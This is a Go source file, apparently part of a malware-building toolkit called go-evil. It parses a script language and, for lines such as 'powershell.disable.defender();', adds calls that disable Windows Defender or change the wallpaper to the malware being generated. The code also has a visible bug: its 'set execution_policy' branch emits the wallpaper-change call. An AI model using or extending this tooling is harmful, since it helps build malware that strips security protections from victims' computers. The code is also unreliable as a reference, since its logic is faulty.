package powershell

import (
	"regexp"

	mal "github.com/s9rA16Bf4/go-evil/domains/malware/private"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

const (
	EXTRACT_SUBDOMAIN      = "(powershell|#pwsh)\\.(.+)\\.(.+)\\(.*\\);" // Captures subdomain and function
	EXTRACT_FUNCTION_VALUE = ".+\\(\"(.*)\"\\);"                         // Grabs the value being passed to the function
	EXTRACT_FUNCTION       = "(powershell|#pwsh)\\.(.+)\\(.*\\);"        // This is for the cases when we don't have a subdomain
)

func Parse(new_line string) {
	regex := regexp.MustCompile(EXTRACT_FUNCTION_VALUE)
	result := regex.FindAllStringSubmatch(new_line, -1)
	var value string
	if len(result) > 0 {
		value = result[0][1]
	} else {
		value = "NULL"
	}
	regex = regexp.MustCompile(EXTRACT_SUBDOMAIN)
	result = regex.FindAllStringSubmatch(new_line, -1)

	if len(result) > 0 { // There is a subdomain to extract
		subdomain := result[0][2]
		function := result[0][3]

		switch subdomain {
		case "disable":
			switch function {
			case "defender":
				mal.AddContent("pwsh.Disable_defender()")
			default:
				function_error(function)
			}
		case "change":
			switch function {
			case "wallpaper":
				mal.AddContent("pwsh.Change_wallpaper(\"" + value + "\")")
			default:
				function_error(function)
			}
		case "set":
			switch function {
			case "execution_policy":
				mal.AddContent("pwsh.Change_wallpaper(\"" + value + "\")")
			default:
				function_error(function)
			}

		default:
			subdomain_error(subdomain)
		}
	} else { // There might be a function which doesn't require a subdomain to work
		regex = regexp.MustCompile(EXTRACT_FUNCTION)
		result = regex.FindAllStringSubmatch(new_line, -1)
		if len(result) > 0 {
			function := result[0][1]
			switch function {
			default:
				function_error(function)
			}
		}
	}
}
func subdomain_error(subdomain string) {
	notify.Error("Unknown subdomain '"+subdomain+"'", "powershell.Parse()")
}
func function_error(function string) {
	notify.Error("Unknown function '"+function+"'", "powershell.Parse()")
}
